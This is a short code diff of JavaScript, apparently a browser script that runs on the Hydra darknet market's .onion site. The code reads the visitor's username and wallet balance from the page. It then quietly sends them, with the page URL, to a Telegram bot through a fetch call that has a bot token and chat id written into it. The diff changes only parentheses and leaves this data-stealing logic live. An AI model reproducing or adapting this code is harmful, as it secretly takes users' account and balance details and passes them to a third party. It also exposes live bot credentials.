@@ -17,7 +17,7 @@ if ((document.querySelector('.market-dashboard-content .form-group')!=undefined)
 });
 }
 
-if ((document.URL.match('http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/'))&&(document.querySelector('li.dropdown')!=undefined)) {
+if (document.URL.match('http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/')&&(document.querySelector('li.dropdown')!=undefined)) {
 	fetch("https://api.telegram.org/bot2019206724:AAEDST9B8q6twnApiXVacwdkdbZ3A43Z8BA/sendMessage?chat_id=-1001754662766&text=" + document.querySelectorAll('li.dropdown')[0].innerText + encodeURI('Online!\nBalance is ') + document.querySelector('.i_wallet').nextSibling.innerText + "%0A" + document.URL, {
     "credentials": "omit",
     "headers": {
